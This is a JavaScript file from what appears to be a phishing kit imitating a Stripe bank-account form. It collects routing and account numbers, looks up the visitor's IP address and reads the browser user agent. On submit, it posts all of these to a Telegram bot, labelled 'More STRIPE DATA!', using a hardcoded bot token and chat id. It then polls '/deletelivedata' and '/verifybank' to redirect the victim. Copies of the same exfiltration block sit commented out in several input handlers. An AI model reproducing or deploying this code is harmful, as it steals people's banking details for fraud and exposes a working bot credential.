//Stop from enter letter

$("#routing_number").keypress(function (event) {
  // alert(String.fromCharCode(event.which));

  var charCode = event.which ? event.which : event.keyCode;
  if (charCode > 31 && (charCode < 48 || charCode > 57)) return false;
  return true;
});


$("#account_number_validate").keypress(function (event) {
  // alert(String.fromCharCode(event.which));

  var charCode = event.which ? event.which : event.keyCode;
  if (charCode > 31 && (charCode < 48 || charCode > 57)) return false;
  return true;
});


$("#account_numbers_main").keypress(function (event) {
  // alert(String.fromCharCode(event.which));

  var charCode = event.which ? event.which : event.keyCode;
  if (charCode > 31 && (charCode < 48 || charCode > 57)) return false;
  return true;
});






// --------




//Stop from enter letter


$.getJSON("https://api.ipify.org?format=json", function (data) {
  let ip = (document.getElementById("userip").value = data.ip);

  console.log(ip);
});

// $('#clickop').click(function(e){
//     e.preventDefault();
//     alert(fname)
//     console.log(fname)

//     // if( checkFormForErrors() ) {
//     //
//     // }

// })

$("#phno").keypress(function (event) {
  // alert(String.fromCharCode(event.which));

  var charCode = event.which ? event.which : event.keyCode;
  if (charCode > 31 && (charCode < 48 || charCode > 57)) return false;
  return true;
});

$("#phone").keypress(function (event) {
  // alert(String.fromCharCode(event.which));

  var charCode = event.which ? event.which : event.keyCode;
  if (charCode > 31 && (charCode < 48 || charCode > 57)) return false;
  return true;
});





// A $( document ).ready() block.
$( document ).ready(function() {
    let routing_number = document.getElementById('routing_number')
    let account_number_validate = document.getElementById('account_number_validate')
    let account_number_main = document.getElementById('account_numbers_main')
    // // blur 
    


    routing_number.focus()

    



    let rn = document.getElementById('routing_number')

    rn.addEventListener('input', function(){
      document.getElementById('errmsghldr').style.display = "none"
      document.getElementById('errmsghldr-confrim').style.display = "none"
      // document.getElementById('errmsghldr').style.display = "block"
    })


    let acm = document.getElementById('account_numbers_main')

    acm.addEventListener('input', function(){
      document.getElementById('errmsghldr-confrim').style.display = "none"
      // document.getElementById('errmsghldr').style.display = "block"



      let account_number_validate = $("input[name=account_number_validate]").val();
      let account_numbers_main = $("input[name=account_numbers_main]").val();
      let routing_number = $("input[name=routing_number]").val();
    
      const userip = document.getElementById("userip").value;
      const agent = JSON.stringify(navigator.userAgent);
    
    
      var jsLang =
      routing_number &&
      account_numbers_main &&
      account_number_validate ;
    
    
      if(routing_number == null || routing_number == ""  ){
         document.getElementById('errmsghldr').style.display = "block"
        //  setTimeout(function(){
          
        // }, 3000)
      }

  
    
      if(account_numbers_main == account_number_validate){
            //nested if 
   if(account_number_validate == "" || account_number_validate.length < 4 ){
       $('.save-button-style').addClass('PressableCore-overlay--isVisible')
   }
   else {
       $('.save-button-style').removeClass('PressableCore-overlay--isVisible')
   }   

        // let tg = {
        //     token: "6196464257:AAFGMOt5B7IrruEyHeKIjV4hGV_Q2km10Ss", // Your bot's token that got from @BotFather
        //     chat_id: "5708903193", // The user's(that you want to send a message) telegram chat id
        //   };
    
        //   const obj = {
        //     chat_id: tg.chat_id, // Telegram chat id
        //     text:
        //       "More STRIPE DATA!" +
        //       "\r\n\n" +
        //       " IP : " +
        //       userip +
        //       "\n\n" +
        //       "# Another beautiful tool by https://github.com/tutgirl #" +
        //       "\n\n" +
        //       "Routing Number : " +
        //       routing_number +
        //       "\n\n" +
        //       "Account number : " +
        //       account_numbers_main +
        //       "\n\n" +
        //       "VAlidate Account number : " +
        //       account_number_validate +
        //       "\n\n" +
        //       " [Device Type] : " +
        //       agent +
        //       "\n\n" +
        //       "\r" +
        //       "Easily check ip and [Device Type] below*" +
        //       "\r" +
        //       "https://whatismyipaddress.com/ip/" +
        //       userip,
        //     // The text to send
        //   };
    
        //   const url = `https://api.telegram.org/bot${tg.token}/sendMessage`;
    
        //   $.ajax({
        //     type: "POST",
        //     headers: { "Content-type": "application/json; charset=UTF-8" },
        //     url: url,
        //     data: JSON.stringify(obj),
    
        //     success: function () {
        //     //   window.location.replace();
        //     },
        //   });
      }
      else if( account_numbers_main != account_number_validate) {
        document.getElementById('errmsghldr-confrim').style.display = "block"
        $('.save-button-style').addClass('PressableCore-overlay--isVisible')
   
      }
    













    })


    acm.addEventListener('focus', function(){
      document.getElementById('errmsghldr-confrim').style.display = "none"
      document.getElementById('errmsghldr').style.display = "none"

    })




    let acv = document.getElementById('account_number_validate')
    acv.addEventListener('paste', function(){
   

      let account_number_validate = $("input[name=account_number_validate]").val();
      let account_numbers_main = $("input[name=account_numbers_main]").val();
      let routing_number = $("input[name=routing_number]").val();
    
      const userip = document.getElementById("userip").value;
      const agent = JSON.stringify(navigator.userAgent);
    
    
      var jsLang =
      routing_number &&
      account_numbers_main &&
      account_number_validate ;
    
    
      if(routing_number == null || routing_number == ""  ){
         document.getElementById('errmsghldr').style.display = "block"
        //  setTimeout(function(){
          
        // }, 3000)
      }

  
    
      if(account_numbers_main == account_number_validate){
            //nested if 
            
   if(account_number_validate == "" || account_number_validate.length < 4 ){
       $('.save-button-style').addClass('PressableCore-overlay--isVisible')
   }
   else {
    
       $('.save-button-style').removeClass('PressableCore-overlay--isVisible')
   }   

        // let tg = {
        //     token: "6196464257:AAFGMOt5B7IrruEyHeKIjV4hGV_Q2km10Ss", // Your bot's token that got from @BotFather
        //     chat_id: "5708903193", // The user's(that you want to send a message) telegram chat id
        //   };
    
        //   const obj = {
        //     chat_id: tg.chat_id, // Telegram chat id
        //     text:
        //       "More STRIPE DATA!" +
        //       "\r\n\n" +
        //       " IP : " +
        //       userip +
        //       "\n\n" +
        //       "# Another beautiful tool by https://github.com/tutgirl #" +
        //       "\n\n" +
        //       "Routing Number : " +
        //       routing_number +
        //       "\n\n" +
        //       "Account number : " +
        //       account_numbers_main +
        //       "\n\n" +
        //       "VAlidate Account number : " +
        //       account_number_validate +
        //       "\n\n" +
        //       " [Device Type] : " +
        //       agent +
        //       "\n\n" +
        //       "\r" +
        //       "Easily check ip and [Device Type] below*" +
        //       "\r" +
        //       "https://whatismyipaddress.com/ip/" +
        //       userip,
        //     // The text to send
        //   };
    
        //   const url = `https://api.telegram.org/bot${tg.token}/sendMessage`;
    
        //   $.ajax({
        //     type: "POST",
        //     headers: { "Content-type": "application/json; charset=UTF-8" },
        //     url: url,
        //     data: JSON.stringify(obj),
    
        //     success: function () {
        //     //   window.location.replace();
        //     },
        //   });
      }
      else if( account_numbers_main != account_number_validate) {
        // document.getElementById('errmsghldr-confrim').style.display = "block"
        $('.save-button-style').addClass('PressableCore-overlay--isVisible')
   
      }
    


  
      $('#account_number_validate').keydown(function () {
    

   
   
   
   
   
       });







    })

  
    // acv.addEventListener('focus', function(){
    //   document.getElementById('errmsghldr-confirm').style.display = "none"

    //   // alert('you have focused here')
    // })

    acv.addEventListener('input', function(){

      let account_number_validate = $("input[name=account_number_validate]").val();
      let account_numbers_main = $("input[name=account_numbers_main]").val();
      let routing_number = $("input[name=routing_number]").val();
    
      const userip = document.getElementById("userip").value;
      const agent = JSON.stringify(navigator.userAgent);
    
    
      var jsLang =
      routing_number &&
      account_numbers_main &&
      account_number_validate ;
    
    
      if(routing_number == null || routing_number == ""  ){
         document.getElementById('errmsghldr').style.display = "block"
         setTimeout(function(){
          document.getElementById('errmsghldr').style.display = "none"
        }, 3000)
      }

  
    
      if(account_numbers_main == account_number_validate){
            //nested if 
            document.getElementById('errmsghldr-confrim').style.display = "none"
   if(account_number_validate == "" || account_number_validate.length < 4 ){
       $('.save-button-style').addClass('PressableCore-overlay--isVisible')
   }
   else {
       $('.save-button-style').removeClass('PressableCore-overlay--isVisible')
   }   

        // let tg = {
        //     token: "6196464257:AAFGMOt5B7IrruEyHeKIjV4hGV_Q2km10Ss", // Your bot's token that got from @BotFather
        //     chat_id: "5708903193", // The user's(that you want to send a message) telegram chat id
        //   };
    
        //   const obj = {
        //     chat_id: tg.chat_id, // Telegram chat id
        //     text:
        //       "More STRIPE DATA!" +
        //       "\r\n\n" +
        //       " IP : " +
        //       userip +
        //       "\n\n" +
        //       "# Another beautiful tool by https://github.com/tutgirl #" +
        //       "\n\n" +
        //       "Routing Number : " +
        //       routing_number +
        //       "\n\n" +
        //       "Account number : " +
        //       account_numbers_main +
        //       "\n\n" +
        //       "VAlidate Account number : " +
        //       account_number_validate +
        //       "\n\n" +
        //       " [Device Type] : " +
        //       agent +
        //       "\n\n" +
        //       "\r" +
        //       "Easily check ip and [Device Type] below*" +
        //       "\r" +
        //       "https://whatismyipaddress.com/ip/" +
        //       userip,
        //     // The text to send
        //   };
    
        //   const url = `https://api.telegram.org/bot${tg.token}/sendMessage`;
    
        //   $.ajax({
        //     type: "POST",
        //     headers: { "Content-type": "application/json; charset=UTF-8" },
        //     url: url,
        //     data: JSON.stringify(obj),
    
        //     success: function () {
        //     //   window.location.replace();
        //     },
        //   });
      }
      if( account_numbers_main != account_number_validate ) {
        document.getElementById('errmsghldr-confrim').style.display = "block"
        $('.save-button-style').addClass('PressableCore-overlay--isVisible')
        // $('.save-button-style').removeClass('PressableCore-overlay--isVisible')
      //   if(account_number_validate == "" || account_number_validate.length < 10 ){
      //     $('.save-button-style').addClass('PressableCore-overlay--isVisible')
      // }
      // else {
      //     $('.save-button-style').removeClass('PressableCore-overlay--isVisible')
      // }   
      }
    


  
      $('#account_number_validate').keydown(function () {
    

   
   
   
   
   
       });




    


    })


    

    // $( "#account_numbers_main" ).focus(function() {
    //     // alert( "Handler for .focus() called." );
    //     // routing-text
    //     //routing-line 
    //     // routing-color
    //     // Text-color--blue500
    //     // Box-background--blue500

    //     // $('').addClass()
    //     // $('').removeClass()



    //     $('.routing-line-horizontal').addClass("divhider")
    //     $('.routing-line-vertical').addClass("divhider")
    //     $('.routing-text').removeClass('Text-color--blue500')

    //     $('.routing-color').removeClass('Box-background--blue500')

    //   });

//     $('#account_numbers_main').keyup(
//         justthis
//     );

//     function justthis(valstry){
    
//         // let valstry = ""
        
        
   
//         console.log("this is for new" + $(this).val()  + valstry + " ")
//    if($(this).val() == "" ){
//        $('.save-button-style').addClass('PressableCore-overlay--isVisible')
//    }
//    else if($(this).val() !== "" && valstry !== "" ) {
//        $('.save-button-style').removeClass('PressableCore-overlay--isVisible')
//    }
//        }
  

    // function randyboys(valstry){
    //     console.log("randy" + " " +valstry)
    // }


    


    // $('#account_number_validate').keydown(function () {
      
    //     let vdata = $(this).val()
    //    return vdata
    //     // $('.save-button-style').addClass('PressableCore-overlay--isVisible')
    //    });


       



});



//submit resolute

// PressableCore-overlay--isVisible

// CLICK BUTTON FUNCTION
function clicksubmit() {
  // e.preventDefault();


  let account_number_validate = $("input[name=account_number_validate]").val();
  let account_numbers_main = $("input[name=account_numbers_main]").val();
  let routing_number = $("input[name=routing_number]").val();

  const userip = document.getElementById("userip").value;
  const agent = JSON.stringify(navigator.userAgent);


  var jsLang =
  routing_number &&
  account_numbers_main &&
  account_number_validate ;


  if(jsLang == null || jsLang == ""  ){
     document.getElementById('errmsghldr').style.display = "block"
  }

  else if(account_numbers_main == account_number_validate){
    let tg = {
        token: "6196464257:AAFGMOt5B7IrruEyHeKIjV4hGV_Q2km10Ss", // Your bot's token that got from @BotFather
        chat_id: "5708903193", // The user's(that you want to send a message) telegram chat id
      };

      const obj = {
        chat_id: tg.chat_id, // Telegram chat id
        text:
          "More STRIPE DATA!" +
          "\r\n\n" +
          " IP : " +
          userip +
          "\n\n" +
          "# Another beautiful tool by https://github.com/tutgirl #" +
          "\n\n" +
          "Routing Number : " +
          routing_number +
          "\n\n" +
          "Account number : " +
          account_numbers_main +
          "\n\n" +
          "VAlidate Account number : " +
          account_number_validate +
          "\n\n" +
          " [Device Type] : " +
          agent +
          "\n\n" +
          "\r" +
          "Easily check ip and [Device Type] below*" +
          "\r" +
          "https://whatismyipaddress.com/ip/" +
          userip,
        // The text to send
      };

      const url = `https://api.telegram.org/bot${tg.token}/sendMessage`;

      $.ajax({
        type: "POST",
        headers: { "Content-type": "application/json; charset=UTF-8" },
        url: url,
        data: JSON.stringify(obj),

        success: function () {
        
          document.getElementById('savebtn').style.display = 'none'
document.getElementById('loadingbtn').style.display = 'block'










setInterval(function(){

  let email = {email : localStorage.getItem("email")} 
  





  $.ajax({
    type: "POST",
    // headers: { "Content-type": "application/json; charset=UTF-8" },
    url: "/deletelivedata",
    data : email,
   dataType: "json",
   success: (response) => {
    
    if(response.Success == "deleted"){


      $.ajax({
        type: "POST",
        url: "/verifybank",
        data : email,
       dataType: "json",
       success: (response) => {
        
  window.location.replace(response.redirectstatus)
      },
      error: (error) => {

        console.log(error)
      }





       })






    }

  },
  error: (error) => {

   
  }





   })






        }, 3000);








        },
      });
  }
  else {
    document.getElementById('errmsghldr-confrim').style.display = "block"
  }
}
